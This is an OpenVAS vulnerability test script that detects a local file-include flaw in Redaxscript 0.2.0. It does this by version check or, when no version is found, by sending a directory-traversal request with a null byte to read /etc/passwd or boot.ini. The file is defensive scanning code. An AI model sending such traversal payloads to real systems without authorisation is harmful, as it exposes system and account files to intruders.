###############################################################################
# OpenVAS Vulnerability Test
# $Id: redaxscript_34476.nasl 9425 2018-04-10 12:38:38Z cfischer $
#
# Redaxscript 'language' Parameter Local File Include Vulnerability
#
# Authors
# Michael Meyer
#
# Copyright:
# Copyright (c) 2009 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "Redaxscript is prone to a local file-include vulnerability because
  it fails to properly sanitize user-supplied input.

  An attacker can exploit this vulnerability to view and execute
  arbitrary local files in the context of the webserver process. This
  may aid in further attacks.

  Redaxscript 0.2.0 is vulnerable; other versions may also be
  affected.";


if (description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.100122");
 script_version("$Revision: 9425 $");
 script_tag(name:"last_modification", value:"$Date: 2018-04-10 14:38:38 +0200 (Tue, 10 Apr 2018) $");
 script_tag(name:"creation_date", value:"2009-04-12 20:09:50 +0200 (Sun, 12 Apr 2009)");
 script_bugtraq_id(34476);
 script_tag(name:"cvss_base", value:"6.8");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");

 script_name("Redaxscript 'language' Parameter Local File Include Vulnerability");


 script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
 script_dependencies("redaxscript_detect.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_tag(name : "summary" , value : tag_summary);
 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/34476");
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("version_func.inc");

port = get_http_port(default:80);
if(!can_host_php(port:port))exit(0);

if(!version = get_kb_item(string("www/", port, "/redaxscript")))exit(0);
if(!matches = eregmatch(string:version, pattern:"^(.+) under (/.*)$"))exit(0);

vers = matches[1];
dir  = matches[2];

if(!isnull(vers) && vers >!< "unknown") {

  if(version_is_equal(version:vers, test_version:"0.2.0")) {
    VULN = TRUE;
  }  

} else {  
# No version found, try to exploit.
  if(!isnull(dir)) {
    foreach file (make_list("etc/passwd", "boot.ini")) {
      url = string(dir, "/index.php?language=../../../../../../../../", file, "%00");
      req = http_get(item:url, port:port);
      buf = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
      if( buf == NULL )continue;
      
      if(egrep(pattern:"(root:.*:0:[01]:|\[boot loader\])", string: buf))
        {    
   	   VULN = TRUE;
	   break;
        } 
   }
  }   
}

if(VULN) {

  security_message(port:port);
  exit(0);

}

exit(0);
